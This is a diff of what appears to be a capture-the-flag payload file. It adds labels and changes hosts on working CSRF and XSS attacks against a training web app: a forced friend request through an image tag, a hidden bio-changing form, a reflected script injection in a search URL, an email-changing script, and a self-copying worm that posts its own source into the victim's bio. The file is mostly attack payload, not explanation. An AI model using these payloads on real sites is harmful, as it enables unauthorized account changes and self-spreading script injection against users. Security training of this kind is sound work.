@@ -1,15 +1,20 @@
+CSRF 1
 <img src="http://localhost:8080/friend?name=bryan" />
 
+CSRF 2
 <form method="post" action="http://localhost:8080/set-bio" id="set-bio">
     <input type="hidden" value="give me the flag" name="bio" />
     <input type="submit" />
 </form>
 
-http://localhost:8080/search?term=<script>alert("your flag is mine!")</script>
+XSS 1
+http://ctf.training.xt:8001/search?term=<script>alert("your flag is mine!")</script>
 
+XSS 2
 <script>$.post("http://localhost:8080/set-email", {email: "I think I have been hacked"})</script>
 
+XSS 3
 <script id="malicious_script">
-    $.get("http://localhost:8080/friend?name=bryan");
-    $.post("http://localhost:8080/set-bio", {bio: document.getElementById('malicious_script').outerHTML})
+    $.get("http://ctf.training.xt:8001/friend?name=bryan");
+    $.post("http://ctf.training.xt:8001/set-bio", {bio: document.getElementById('malicious_script').outerHTML})
 </script>
